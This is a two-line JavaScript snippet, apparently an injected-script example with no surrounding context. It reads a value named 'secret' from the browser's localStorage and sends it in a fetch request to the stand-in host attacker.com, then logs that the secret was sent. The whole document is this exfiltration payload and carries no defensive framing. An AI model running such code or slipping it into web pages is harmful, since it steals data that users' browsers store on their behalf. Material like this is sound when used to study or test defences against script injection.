const secret = localStorage.getItem("secret")
fetch("https://attacker.com/" + secret).then(() => console.error("done sending secret"))
